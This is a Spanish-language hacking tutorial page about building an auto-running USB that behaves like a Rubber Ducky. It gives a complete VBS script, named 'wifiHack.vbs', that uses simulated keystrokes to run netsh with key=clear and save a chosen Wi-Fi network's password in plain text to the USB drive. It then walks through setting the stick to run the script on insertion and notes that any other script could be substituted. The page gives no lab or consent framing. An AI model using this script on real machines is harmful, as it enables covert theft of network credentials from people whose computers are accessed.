---
icon: scroll-old
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# USB AutoRun

Si queremos emular el comportamiento de un USB `Rubber Ducky`, que basicamente cuando insertemos el USB en algun PC se ejecute el script que nosotros hayamos programado de forma automatica, esto se consigue haciendo creer al sistema operativo que se esta conectando un teclado y con el script enviar tecla por tecla lo que se quiere escribir o hacer en el S.O. como si fuera un teclado.

Lo que primero tendremos que hacer sera instalar el siguiente programa llamado `AutoRun Creator`:

URL = [Download AutoRun Creator](https://usb-autorun-creator.softonic.com)

Una vez que hayamos descargado el ejecutable llamado `usbac_setup_smof.exe`, solo tendremos que seguir los pasos de instalacion de forma normal, cuando se haya instalado tendremos que buscar en `windows` lo siguiente:

```
USB AutoRun Creator - Editor
```

Ejecutamos esa aplicacion para que se nos habra el programa para crear el USB `AutoRun`, pero antes de seleccionar las opciones, crearemos un script basico para dumpear la informacion de la `red wifi` seleccionada + la contraseña en texto plano de forma automatica:

## <mark style="color:purple;">Crear Script VBS</mark>

> wifiHack.vbs

```vbs
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' 👉 Nombre de la red Wi-Fi y archivo de salida
Dim wifiName
wifiName = "<WIFI_NAME>"
Dim notepadFileName
notepadFileName = "dead.txt"

' 👉 Verifica permisos de administrador
If Not objShell.Run("cmd.exe /c net session >nul 2>&1", 0, True) = 0 Then
    MsgBox "Por favor, ejecuta este script con permisos de administrador.", vbCritical, "Error de permisos"
    WScript.Quit
End If

' 👉 Ruta donde se guardará el archivo (D:\dead.txt)
Dim outputFilePath
outputFilePath = "<LETRA_DE_LA_UNIDAD>:\" & notepadFileName

' 👉 Crear el objeto para enviar teclas
Set x = CreateObject("WScript.Shell")

' 👉 Abrir la ventana de comandos (cmd)
x.SendKeys "^{ESC}"  ' Abre el menú de inicio
WScript.Sleep(1000)

x.SendKeys "cmd"  ' Escribe 'cmd' para buscar el símbolo del sistema
WScript.Sleep(1000)

x.SendKeys "{ENTER}"  ' Ejecuta el comando
WScript.Sleep(1000)

' 👉 Construir el comando para obtener información de la red
x.SendKeys "netsh wlan show profiles """ & wifiName & """ key=clear > """ & outputFilePath & """"
WScript.Sleep(1000)

' 👉 Ejecutar el comando (simula presionar Enter)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

' 👉 Salir de la ventana de comandos (cmd)
x.SendKeys "exit"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(1000)

' 👉 Verifica si el archivo de salida se ha creado en D:\
If objFSO.FileExists(outputFilePath) Then
    ' 👉 Abre el archivo en Notepad
    objShell.Run "notepad.exe """ & outputFilePath & """", 1, False
Else
    MsgBox "No se pudo generar el archivo: " & outputFilePath, vbCritical, "Error"
End If
```

Lo unico que tendremos que cambiar sera la parte de `<WIFI_NAME>` donde tendremos que sustituirlo por el nombre del `wifi` que queramos sacar info y en concreto la contraseña, despues tambien tendremos que cambiar la parte donde pone `<LETRA_DE_LA_UNIDAD>` por la letra de la unidad del USB que es donde se depositara el archivo `dead.txt` donde estara toda la informacion de la `red wifi` con su contraseña.

> EJEMPLO:

```
"<LETRA_DE_LA_UNIDAD>" = "D:\"

"<WIFI_NAME>" = "wifitest"
```

Una vez echo esto lo guardaremos en el USB y por si acaso crearemos el archivo `dead.txt` en el USB tambien.

## <mark style="color:purple;">Crear USB AutoRun</mark>

Llendo donde estabamos en la interfaz del `USB AutoRun Creator` de la aplicacion, tendremos que darle a `Select` en la primera opcion:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y en este seleccionaremos el archivo `wifiHack.vbs` que esta en el USB.

Despues en la segunda opcion seleccionaremos `Browser`:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y seleccionaremos la letra de la unidad del USB, seguidamente le daremos a la opcion `USB Drive`:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y le daremos a `OK`.

Una vez configurado todo solo tendremos que darle al boton llamado `Create` y esto nos creara todo para que el USB inicie de forma automatica el el script que seleccionamos y que el S.O. se piense que el USB es un teclado, para que asi se ejecute el script, una vez que se termine de ejecutar el script, veremos que la informacion del `wifi` y la contraseña estara en ese TXT.

Ya no solo podremos ejecutar ese script, si no que podremos programar otros scripts para que hagan lo que queramos.

Solo tendremos que sacar el USB y volverlo a insertar para que se ejecute el script de forma automatica.
